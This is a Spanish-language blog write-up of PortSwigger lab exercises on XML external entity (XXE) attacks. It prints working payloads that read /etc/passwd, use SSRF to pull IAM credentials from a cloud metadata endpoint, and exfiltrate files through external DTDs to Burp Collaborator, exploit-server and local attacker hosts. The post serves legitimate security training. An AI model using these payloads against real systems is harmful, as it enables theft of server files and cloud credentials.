---
layout: single
title: XXE - Laboratorios de PortSwigger
excerpt: "En esta segunda parte resolveremos los laboratorios sobre ataques XXE de la plataforma PortSwigger."
date: 2023-03-10
classes: wide
header:
  teaser: /assets/images/LabsXXE/labsxxe.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - XXE
  - XML
  - Portswigger
---

<br>

# Laboratorio 1: Explotación de XXE usando entidades externas para recuperar archivos

Vemos las indicaciones del primer laboratorio:

![lab1](/assets/images/LabsXXE/lab1/lab1.png)

Primero nos dice que este laboratorio contiene una función la cual es Comprobar existencias de productos, y nos dice cuantos productos de eso quedan, también dice que se tramita en formato XML.

Nos dice que para completar este laboratorio debemos mostrar el contenido que esta en el archivo /etc/passwd interno de la maquina victima.

<br>

Primero accederemos a el laboratorio y veremos lo siguiente:

![web](/assets/images/LabsXXE/lab1/web.png)

Vemos que nos muestra una web de una tienda, y al abrir algún producto veremos lo siguiente:

![stock](/assets/images/LabsXXE/lab1/stock.png)

Podemos apreciar que debajo del producto al que entramos nos muestra esta función que nos comprueba la existencia de productos disponibles.

Ahora daremos click a "Check stock" pero ahora vamos a interceptar la petición con BurpSuite, y recibimos la siguiente petición:

![xml](/assets/images/LabsXXE/lab1/xml.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			9
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver en la petición que se esta tramitando una petición con formato XML para tramitar datos.

<br>

Intentaremos hacer lo que explicamos en el post anterior, inyectaremos nuestra propia entidad genérica para ver si funciona y nos interpreta lo que inyectemos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe "Prueba"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver que después de agregar nuestra entidad genérica en el DTD, llamada **xxe** con el valor de **"Prueba"**, y vemos que nos responde lo siguiente:

![xml](/assets/images/LabsXXE/lab1/pruebaEntity.png)

Podemos apreciar que nos responde el mensaje: **"Invalid product ID: Prueba"**, y llamamos a la entidad en las etiquetas de **productId** ya que ahí nos dimos cuenta que se estaban devolviendo valores en pantalla y poder verlos.

<br>

Ahora que sabemos que podemos inyectar entidades entonces inyectaremos una entidad externa para tomar los datos de /etc/passwd, para ello hacemos lo siguiente:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Recordamos que usando el wrapper **"file://"** podemos recuperar datos de un archivo.

Al tramitar la petición veremos lo siguiente:

![xml](/assets/images/LabsXXE/lab1/passwd.png)

Podemos apreciar que nos ha dado el archivo /etc/passwd, y hemos terminado con este primer laboratorio:

![end](/assets/images/LabsXXE/lab1/end.png)

<br>

# Laboratorio 2: Explotación de XXE para realizar ataques SSRF

![xml](/assets/images/LabsXXE/lab2/lab2.png)


En este laboratiro haremos uso del XXE para hacer ataques SSRF, que enseguida veremos que es.

El SSRF(Server-Side Request forgery) es un ataque y lo que hace es por ejemplo, tenemos acceso a un servidor web el cual tiene integrada una función la cual te descarga lo que le pongas en la entrada de esa función, pero en caso de que en la red interna del servidor existan otros equipos conectados a la misma red, podriamos descargas datos importantes de alguna maquina que este en la red del servidor web.

Veamos un ejemplo:

![Diagrama](/assets/images/LabsXXE/lab2/diagrama.png)

Como podemos ver en el ejemplo del diagrama, nuestra maquina atacante tiene conexón con el servidor web, pero no con las maquinas internas de ese servidor web, entonces lo que hace el SSRF es conectarse a el servidor web, y desde el servidor web hacer peticiones maliciosas con el fin de obtener información importante, lo que hacemos es atacar a las maquinas internas desde el servidor web, y de esta forma si tendremos acceso a esas maquinas internas.

Lo que haremos en este nivel será como dice, haremos un SSRF aprovechandonos de un XXE.

Nos dice que del lado del servidor hay un EC2 lo cual en pocas palabras es una especie de servidor en la nube, como estan en la misma red nos dice que debemos recuperar una clave secreta usando una funcion que tiene el servidor web principal, el cual es recuperar metadatos, y esto lo veremos ahora.

También nos dice que la vulnerabilidad XXE se ejecuta desde la función **"check stock"**.

Así que primero iniciaremos el laboratorio en el apartado vulnerable:

![vuln](/assets/images/LabsXXE/lab2/vuln.png)

Daremos en check stock e interceptaremos la petición para ver que nos muestra:

![xml](/assets/images/LabsXXE/lab2/xml.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver la siguiente estructura XML, por lo que intentaremos inyectar nuestra entidad en el DTD, y ver si es vulnerable:

![xxe](/assets/images/LabsXXE/lab2/xxe.png)

Podemos apreciar que nos muestra el contenido del servidor, por lo que es vulnerable, así que ahora lo que haremos es el objetivo de este laboratorio, descubrir la clave secreta que esta dentro de un servidor aislado de nuestra maquina atacante pero al cual en teoría podemos acceder haciendo las consultas desde el servidor web, y como ese servidor web esta en la misma red que el servidor aislado, podremos tener conexión.

Vemos que en las instrucciónes del laboratorio nos dice que existe un EC2 que como recordamos es un servidor que esta en la red interna del servidor que intentamos atacar, nos dice que la ip del EC2 es **http://169.254.169.254/**.

Así que un esquema de lo que estamos haciendo ahora sería algo así:

![ec2](/assets/images/LabsXXE/lab2/ec2.png)

Podemos apreciar que tenemos conexión con el servidor web, pero no con la maquina EC2 a la que el servidor web si tiene acceso.

Y en caso de que ese servidor tenga capacidad de **directory listing** podremos ver datos y buscar algo valioso.

<br>

Así que ahora através de la vulnerabilidad XML, llamaremos a la ip del servidor EC2, y como la petición la interpretará el servidor web y ese servidor web tiene acceso a el EC2, entonces nos podrá listar algo en caso de estar habilitado un **directory listing**.

Nuestra consulta se verá así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y vemos que al tramitar la petición nos responde lo siguiente:

![latest](/assets/images/LabsXXE/lab2/latest.png)

Podemos apreciar que nos ha listado una ruta llamada **latest** en el mensaje de respuesta, así que agregaremos ese valor a la url de la entidad y veremos que queda así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y ahora veremos la respuesta:

![metadata](/assets/images/LabsXXE/lab2/metadata.png)

Ahora nos listo otra ruta llamada **meta-data**, por lo cual la pondremos en la url y seguir aver que más encontramos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y vemos la respuesta:

![iam](/assets/images/LabsXXE/lab2/iam.png)

Ahora vemos otra ruta llamada iam, la cual al entrar nuevamente agregandola a la url:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Veremos lo siguiente:

![credentials](/assets/images/LabsXXE/lab2/credentials.png)

Y al acceder a esta otra ruta que encontramos llamada **security-credentials** veremos lo siguiente:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Ahora vemos que dentro de esta ruta encontramos esto:

![admin](/assets/images/LabsXXE/lab2/admin.png)

Encontramos otra ruta o archivo llamado **admin**, al cual al acceder veremos lo siguiente:

![dat](/assets/images/LabsXXE/lab2/dat.png)

Y podemos ver que hemos encontrado las credenciales al parecer del usuario admin.

Y ya habremos terminado con este laboratorio 2.

<br>

# Laboratorio 3: XXE Blind With Out-of-band

En este laboratorio vemos que nos pide lo siguiente:

![lab3](/assets/images/LabsXXE/lab3/lab3.png)

nos dice que debemos usar una entidad externa, osea alguna url de otro servidor al que tengamos control de las peticiones que se reciben, y que hagamos una consulta HTTP usando como servidor a recibir, BurpCollaborator.

Al acceder a este nivel y como sabemos interceptar la petición donde esta la parte vulnerable vemos la siguiente estructura XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			9
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![xml](/assets/images/LabsXXE/lab3/xml.png)

Podemos apreciar que tenemos esta estructura XML, y como ya hemos visto trataremos de inyectar nuestra entidad en el DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe "hola"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![invalid](/assets/images/LabsXXE/lab3/invalid.png)

Podemos apreciar que nos dice que el ID del producto es invalido, esta vez ya no nos esta devolviendo ningun valor de alguna etiqueta que esta en la estructura XML.

Por lo que en estos casos toca trabajar a ciegas usando algún servidor externo, BurpSuiteProfessional contiene un apartado llamado **"BurpCollaboratorClient"**, que se encuentra en la pestaña de arriba de Burp, lo que hace este apartado es crearnos un servidor al cual podamos enviar peticiónes para practicar esto, al abrir ese apartado veremos lo siguiente:

![burp](/assets/images/LabsXXE/lab3/burp.png)

Vemos este menu, y en la parte de **Generate collaborator payloads**, vemos un boton que dice **Copy to clipboard**, al darle nos copiara una url de un servidor que se acaba de crear y podremos recibir las peticiones que le hagamos, en el objetivo de este nivel solo es enseñarnos a usar esta función, así que al agregar esta url a la peticion:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://pjctd07aibvq11qf4eds3tzp7gd61v.burpcollaborator.net"> ]>
	<stockCheck>
		<productId>
			14
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![url](/assets/images/LabsXXE/lab3/urlxml.png)

Vemos que nos responde el mensaje **Invalid product ID**, pero si ahora en la sección de BurpCollaborator vamos y damos en el boton de PollNow veremos lo siguiente:

![response](/assets/images/LabsXXE/lab3/response.png)

Podemos apreciar que hemos recibido a nuestro servidor de burp, la petición HTTP que hemos interceptado y enviado.

Y como este laboratorio solo era mostrarnos como funciona el BurpCollaborator habremos terminado este laboratorio:

![fin](/assets/images/LabsXXE/lab3/fin.png)

# Prueba de laboratorio local antes del siguiente laboratorio.

Primero volveremos a hacer un ejemplo que debemos entender antes que el laboratorio 4, y después seguiremos con el laboratorio 4.

Volveremos a usar nuestro laboratorio que montamos en docker, una vez estemos, recordaremos que al interceptar una petición veremos algo así:

![xml](/assets/images/LabsXXE/prueba/xml.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<root>
		<name>Dansh</name>
		<tel>123123</tel>
		<email>dansh@test.com</email>
		<password>qweqwdawe12312</password>
	</root>
```

Como recordamos, podemos ver la petición interceptada de nuestro laboratorio local, y sabemos que es vulnerable, supongamos que queremos hacer la tipica manera de inyectar en nuestro DTD una entidad y luego mostrar algo para ver si esto es vulnerable, recuerda que esto se hacia así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<root>
		<name>Dansh</name>
		<tel>123123</tel>
		<email>&xxe;</email>
		<password>qweqwdawe12312</password>
	</root>
```

En este caso si nos mostrara el archivo "/etc/passwd", pero vamos a suponer que no nos respondio nada, y solo nos mostro algun mensaje de advertencia, por ejemplo **"no se pueden inyectar entidades"**, por poner algún ejemplo, entonces como no nos esta mostrando nada ya que ninguna etiqueta se esta devolviendo, lo que podemos hacer en estos casos es lo siguiente, haremos un Out of band interaction.

Y esto lo haremos a través de entidades en el DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.1.70/prueba"> %xxe; ]>
	<root>
		<name>Dansh</name>
		<tel>123123</tel>
		<email>dansh@test.com</email>
		<password>qweqwdawe12312</password>
	</root>
```
> Ya no es necesario llamar a la entidad fuera del DTD ya que podría provocar errores.

Vemos que hemos agregado el simbolo de porcentaje al declarar la entidad **xxe** en el DTD, y también al final llamaremos a la entidad dentro del DTD usando **%xxe;**.

Lo que definimos en la entidad **xxe** es que obtendra un recurso el cual esta en este caso en nuestra maquina atacante, para acceder a el archivo llamado **prueba** el cual compartiremos desde nuestra maquina atacante através de un servidor python http compartido.

Y antes de tramitar la petición debemos activar el servidor compartido en la ruta del archivo **prueba**, en este caso aún no defini el archivo prueba, por lo que al tramitar la petición, en el historial del servidor python compartido veremos lo siguiente:

![listen](/assets/images/LabsXXE/prueba/listening.png)

Vemos que ya esta activo, por lo que tramitaremos la petición anterior XML:

![response](/assets/images/LabsXXE/prueba/response.png)

Y podemos apreciar que en la respuesta del servidor web no vemos nada, pero si vamos a la terminal desde donde tenemos el servidor compartido veremos lo siguiente:

![404](/assets/images/LabsXXE/prueba/404.png)

y veremos este error ya que el archivo **prueba** aún no existe en nuestro servidor python compartido que ejecuta nuestra maquina atacante, pero con esto comprobamos que ya hay conexión, así que antes de repetir esta petición, lo que haremos será definir el archivo **prueba**, e indicarle en formato XML acciones maliciosas.

Para ello crearemos un archivo en la ruta del servidor compartido llamado **prueba** en este caso.

Y este contendrá lo siguiente:

![prueba](/assets/images/LabsXXE/prueba/prueba.png)


`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`

En esta primera entidad que definimos llamada **file**, lo que hace es tomar el contenido del archivo **/etc/passwd**, para después convertirlo a base64, esta entidad la usaremos mas adelante, pero debe estar definida.

La siguiente entidad es esta:

`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.70/?parametro=%file;'>">`

Esta entidad llamada eval, lo que contiene es la definicion de otra entidad dentro de esta, pero como sabemos para declarar entidades en el DTD, se necesita usar el porcentaje, pero si lo agregamos dentro de otra entidad esto hará que el servidor se confunda al interpretar estos valores XML dandonos error, por eso debemos poner el porcentaje pero en formato hexadecimal, el cual es 25, pero debemos agregarle el &#x para que nos funcione, después esta nueva entidad se llamará **exfil**, que es lo que hará que veamos el /etc/passwd en base64 en el lado del servidor web python.

Dentro de ahí le damos la ip a la que se va a conectar, para después asignar el parametro llamado **parametro** por poner un ejemplo, aunque puede ser cualquiera, y el valor de este parametro será la entidad que creamos llamada **file**, la cual como recordamos se encargara de obtener el archivo **/etc/passwd** codificado en base64, y por último llamaremos a las entidades:

```
%eval;
%exfil;
```
> Primero se define la entidad eval la cual contiene la instrucción de que archivo tomará, y después se llama a la que hará ese proceso para llegar a el archivo.

Y nuestro archivo final se verá así:

![end](/assets/images/LabsXXE/prueba/final.png)

al momento de guardar el archivo, activar el servidor http compartido en la ruta del archivo llamado **prueba** el cual contiene estas entidades, y tramitar la petición, veremos lo siguiente:

![b64](/assets/images/LabsXXE/prueba/base64.png)

Vemos que hemos recibido el valor del archivo **/etc/passwd** en la respuesta del parametro llamado **parametro**.

por lo que solo queda decodificar el valor de base64 y vemos que se trata del archivo **/etc/passwd**:

![decode](/assets/images/LabsXXE/prueba/decode.png)

# Laboratorio 4: XXE Blind With Out-of-band a través de entidades de parámetros XML

![lab4](/assets/images/LabsXXE/lab4/lab4.png)

Podemos ver que este laboratorio nos dice que esta vez ya no nos va a permitir inyectar entidades como comunmente lo haciamos, y nos dice que para resolver esto debemos hacer una entidad en el DTD y hacer una solicitud http a un servidor de burpcollaborator.

Esto será parecido a el ejemplo anterior solo que usando un servidor de burpcollaborator.

Por ahora en este laboratorio solo dice que hagamos la petición através de la entidad que inyectaremos, más adelante apuntaremos a un archivo pero por ahora solo nos pide hacer la petición HTT hacia el servidor de burpcollaborator.

<br>

Así que ya teniendo la petición de la parte que sabemos que es vulnerable, en este caso la función de comprobar existencias dentro de la tienda del laboratorio, así que al interceptar una petición de esta función vemos lo siguiente:

![xml](/assets/images/LabsXXE/lab4/xml.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			9
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver la tipica estructura XML que hemos visto en los laboratorios anteriores, solo que si esta vez intentamos inyectar una entidad común de XXE:

![error](/assets/images/LabsXXE/lab4/error.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe "hola"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos apreciar que nos da el mensaje **"Entities are not allowed for security reasons"**, por lo que ya no podemos inyectar entidades de esta forma común.

Por lo que ahora tocaría hacer que la petición XML envie una petición a un servidor web tercero, el cual podría contener algun archivo para que la web victima interprete el codigo XML para ejecutar instrucciónes malicosas, pero en este caso primero solo nos intresa la petición a el servidor tercero.

Por lo que iremos a el apartado de BurpCollaborator y tomaremos una url:

![poll](/assets/images/LabsXXE/lab4/poll.png)

Damos en **"CopyToclipboard"**, y obtendremos una url similar a esta:**"a8jfnmr2ktwurmko35ehkcp5vw1mpb.burpcollaborator.net"**, esta url es nuestro servidor tercero temporal creado por burpcollaborator, ahora declararemos una entidad, la cual contendra una llamada a esta url, y después llamamos a dicha entidad para que nos haga la petición:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://a8jfnmr2ktwurmko35ehkcp5vw1mpb.burpcollaborator.net"> %xxe;]>
	<stockCheck>
		<productId>
			9
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![res](/assets/images/LabsXXE/lab4/response.png)

> Recuerda que los porcentajes se usan para declarar y llamar desde el DTD.

Y al tramitar esta petición podemos observar que nos muestra otro mensaje que dice **"XML parsing error"**, pero no le tomaremos importancia, ahora iremos a el burpcollaborator y daremos en el boton de **pollNow**, y veremos que nos ha llegado nuestra petición HTTP desde el servidor del laboratorio:

![pollnow](/assets/images/LabsXXE/lab4/pollnow.png)

Y ya habremos tenido la conexión deseada, este laboratorio fue para enseñarnos a hacer entidades desde el DTD y llamar a un servidor tercero, y ver que nos responde, ya que lo siguiente será lo mismo pero esta vez nos tomara algun archivo con instrucciónes maliciosas del servidor tercero.

Así que al ir a ver el laboratorio nuevamente veremos que nos aparece que esta completado:

![fin](/assets/images/LabsXXE/lab4/fin.png)

> Recuerda apagar el intercept para que se tramite la petición que tenias capturada.

<br>

# Laboratorio 5: Explotación de XXE Blind para exfiltrar datos usando un DTD externo malicioso.

En este laboratorio 5 veremos que nos pide lo siguiente:

![lab5](/assets/images/LabsXXE/lab5/lab5.png)

Nos dice que devemos exfiltrar el archivo llamado /etc/hostname, así que si intentamos inyectar nuestras entidades comunes en la petición XML, no nos mostrará nada, por lo que nos ahorramos algo que ya sabemos que va a pasar, así que en la petición hacemos lo que hicimos en el laboratorio anterior:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://6qxjqifs5yua1hf7d27ch2gga7gx4m.burpcollaborator.net"> %xxe;]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![response](/assets/images/LabsXXE/lab5/response.png)


Vemos la petición que hemos interceptado de la función que sabemos que es vulnerable, y también hemos modificado lo que hicimos en el anterior, estamos llamando a un servidor tercero que como sabemos lo hemos hecho usando el burpcollaborator(obviamente una nueva url), para que nos tome un recurso y en este caso nos lo interpretará.

Y al tramitar la petición, vemos que abajo nos ha respondido el mensaje **"XML parsing error"**, pero si vamos al lado del servidor el BurpCollaborator veremos que hemos recibido la petición desde el servidor del laboratorio:

![server](/assets/images/LabsXXE/lab5/server.png)

Hasta ahora esto ya lo habiamos hecho en el laboratorio anterior, pero ahora el nivel nos dice que debemos filtrar un archivo llamado /etc/hostname, por lo que ahora al ir a el laboratorio veremos lo siguiente:

![botones](/assets/images/LabsXXE/lab5/botones.png)

Podemos apreciar que hay 2 opciones nuevas, una para cargar nuestro exploit, y otra para subir la flag, iremos a la primera y veremos lo siguiente:

![craft](/assets/images/LabsXXE/lab5/craft.png)

En este apartado es donde vamos a crear nuestro DTD externo, esta parte en la que estamos es una nueva url pero sigue siendo parte del nivel, solo que desde aqui es donde vamos a crear nuestro DTD externo, vemos que hay varias opciones.

En este caso solo modificaremos el contenido, y declararemos el DTD externo que hará instricciónes maliciosas:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xcdbuvruomslp2moktnz90fjeak28r.burpcollaborator.net/?content=%file;'>">
%eval;
%exfil;
```
Crear una entidad llamada **file** para tomar el archivo /etc/hostname, esta vez usamos el wrapper **file://** y no el de base64 ya que como este archivo solo tiene 1 linea no tendremos problema al recibir la respuesta.

En la segunda linea estamos declarando la entidad llamada **eval**, la cual esta declarando otra entidad dentro de ella, recordemos que el valor **&#x25;** es el simbolo de porcentaje pero en hexadecimal para que no se confunda la sintaxis.

Después en esa subentidad que declaramos llamada **exfil**, contendrá el contenido el cual conecta con nuestro servidor tercero, y enviamos la peticion a nuestro servidor tercero ya que ahí podremos ver la respuesta que llegan en el registro de burpcollaborator en este caso, y como en la primera entidad llamada **file** ya tomamos lo que nos interesa, simplemente lo mostraremos a través de un parametro llamado **content**, el cual llamará a la entidad **file**.

Esto ultimo del parametro, lo que hace es llamar a la entidad **file** la cual contiene el valor del archivo que nos interesa, y se hace de esta manera para que en los registros de nuestro servidor tercero podamos apreciar el contenido de ese archivo.

Por último se debe llamar a eval y después a exfil, ya que si llamamos primero a exfil no puede llamarse ya que depende de eval para existir, por lo que primero va eval.

<br>

Una vez creado nuestro exploit, lo que haremos será tomar la url que nos deja arriba:

![url](/assets/images/LabsXXE/lab5/url.png)

Y ahora desde la petición que teniamos interceptada, pondremos esta url que apunta a nuestro exploit:

![exploit](/assets/images/LabsXXE/lab5/exploit.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a92004104741dc7c3ae00b101b80069.exploit-server.net/exploit"> %xxe;]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y al tramitar la petición, lo que sucederá es que el laboratorio de donde interceptamos la petición XML, se comunicará a ese servidor externo nuestro, en este caso es la web que contiene el exploit con las instrucciónes maliciosas, una vez esto, lo que sucederá es que  nuestro servidor del laboratorio donde interceptamos el XML, interpretará las instrucciónes maliciosas que teniamos subidas a nuestro servidor tercero, las interpretara en su propio servidor, por lo que tomara el archivo que queremos de su propio servidor, osea el del laboratorio donde interceptamos el XML.

Una vez que tramitemos esto, iremos a el registro del servidor tercero, osea al burpcollaborator en este caso:

![collab](/assets/images/LabsXXE/lab5/collab.png)

Y podemos apreciar abajo en la respuesta que hemos recibido el contenido del archivo **/etc/hostname**, através del parametro **content**.

Y este valor será la flag para terminar el laboratorio:

![flag](/assets/images/LabsXXE/lab5/flag.png)

Y habremos terminado este nivel:

![end](/assets/images/LabsXXE/lab5/end.png)


# Laboratorio 6: Explotación de XXE blind para recuperar datos a través de mensajes de error

Vemos que nos pide lo siguiente:

![lab6](/assets/images/LabsXXE/lab6/lab6.png)

Podemos observar que nos dice que debemos recuperar el archivo llamado **/etc/passwd**, a través de un DTD externo, para así provocar un error en la respuesta y en base a ese error modificar algun parametro para mostrar lo que queremos.

Primero lo que haremos será entrar a el laboratorio, y recordemos que la parte vulnerable es la siguiente función de comprobar existencias:

![xxe](/assets/images/LabsXXE/lab6/xxe.png)

Y al tramitar esta petición al darle click al boton naranja para que se tramite la petición, la interceptaremos con BurpSuite:

![struct](/assets/images/LabsXXE/lab6/struct.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			6
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y podemos apreciar la estructura XML que se tramita por detras, como ya sabemos intentaremos inyectar una entidad basica:

![not](/assets/images/LabsXXE/lab6/not.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe "Prueba"> ]>
	<stockCheck>
		<productId>
			6
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos apreciar que nos dice que no se pueden inyectar entidades por motivos de seguridad dandonos este mensaje: **"Entities are not allowed for security reasons"**.

<br>

Así que ahora lo que se nos viene a la mente es probar con un DTD externo, para ello haremos uso del burpcollaborator:

![collaborator](/assets/images/LabsXXE/lab6/collaborator.png)

> En este caso solo lo usamos para saber si hay conexión pero no es necesario usar collaborator.

Damos a **"Copy to clipboard"**, para obtener nuestro servidor tercero temporal y desde aquí ver lo que va sucediendo.

Una vez tengamos la url copiada, creremos el DTD externo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f6mtwp6r71voyhr9ywx16mnn7ed51u.burpcollaborator.net"> %xxe; ]>
	<stockCheck>
		<productId>
			6
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

![errormessage](/assets/images/LabsXXE/lab6/errormessage.png)

Y podemos apreciar que ahora no nos da el mensaje de hace un momento, el que decia que no es posible inyectar entidades, en este caso nos da un error mas complejo.

Y en el mensaje de respuesta del error vemos algo interesante:

![url](/assets/images/LabsXXE/lab6/url.png)

Podemos ver que llama a el nombre de la página a la que hizo una petición, por lo que esto nos hace pensar que por medio de un parametro podemos obtener cosas valiosas.

Pero antes de esto primero vemos si la conexión a nuestro servidor tercero se hizo correctamente:

![response](/assets/images/LabsXXE/lab6/response.png)

Al dar a **Poll now** podemos apreciar que tuvimos conexión exitosa, por lo que podemos continuar.

Ahora en el laboratorio veremos lo siguiente:

![expserver](/assets/images/LabsXXE/lab6/expserver.png)

Damos a el boton, esto nos llevara a la página donde crearemos nuestro exploit, veremos lo siguiente:

![craft](/assets/images/LabsXXE/lab6/craft.png)

Y ahora lo que haremos aquí no será lo mismo que en el laboratorio anterior, es algo parecido pero no lo mismo.

![crafted](/assets/images/LabsXXE/lab6/crafted.png)

Podemos apreciar lo siguiente:

```xml

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///archivoinexistente/%file;'>">
%eval;
%exfil;

```

En la primera linea estamos definiendo la entidad **file** desde un DTD externo, estamos tomando el archivo **/etc/passwd**.

En la segunda linea estamos declarando otra entidad llamada **eval**, la cual dentro de su definicion de valor estamos definiendo una subentidad llamada **exfil**, recuerda que usamos los caracterés **&#x25;** en lugar del % , ya que en subentidades suele dar error si ponemos el simbolo en formato normal y no en hexadecimal. y esta subentidad va a contener la llamada a un archivo que no existe, pero al final estamos llamando a la entidad **file**, que como sabemos contiene el archivo que nos interesa.

Por último llamamos a las entidades en orden.

Y una vez configurado nuestro exploit, en la parte de arriba nos darán la url, esta url contiene nuestras instrucciónes XML maliciosas.

Ahora en la petición interceptada lo que haremos será que haremos la petición hacia la url que nos ha dado en donde creamos el exploit:

![passwd](/assets/images/LabsXXE/lab6/passwd.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a8500d703e64cd8803d6bac01df0023.exploit-server.net/exploit"> %xxe; ]>
	<stockCheck>
		<productId>
			6
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y podemos ver que al enviar la petición abajo ya nos muestra el archivo **/etc/passwd**, que queriamos.

Lo que paso fue que hicimos una petición desde la web del laboratorio y como el laboratorio interpreto esas instrucciones que le indicamos de una url externa, interpreto esas instrucciones XML maliciosas en su propio servidor por lo que en la respuesta de error vemos através del wrapper file el archivo que nos interesa.

![end](/assets/images/LabsXXE/lab6/end.png)

Y con esto hemos terminado este laboratorio.

# Laboratorio 7: Explotación de XInclude para recuperar archivos

En este laboratorio nos piden lo siguiente:

![lab7](/assets/images/LabsXXE/lab7/lab7.png)

Podemos ver que nos dice que en esto, no podemos inyectar nuestro DTD clasico ya que no tenemos control sobre todo el documento XML.

Y que como alternativa usemos Xinclude para poder recuperar el archivo **/etc/passwd**.

Xinclude lo que hace es interpretar el documento que se le pasa como XML, y no le podemos pasar /etc/passwd ya que no es un XML, pero si podemos hacer otra cosa, que es aregar un atributo especial para que nos deje hacer lo que queremos.

<br>

Pero primero empecemos desde el inicio, primero al interceptar la petición de la función de comprobar existencias veremos lo siguiente:

![peticion](/assets/images/LabsXXE/lab7/peticion.png)

Como podemos observar, esta vez no hay ninguna estructura XML que se este ejecutando, así que intentaremos lo siguiente, iremos a esta web [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

Y nos llevará a un repositorio de github donde swisskyrepo ha reunido multiples payloads para diferentes ataques.

En este caso entraremosa a la carpeta de XXE, y vamos a la seccion que dice **xinclude attacks** y veremos lo siguiente:

![xi](/assets/images/LabsXXE/lab7/xinclude.png)

Veremos la siguiente estructura XML:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

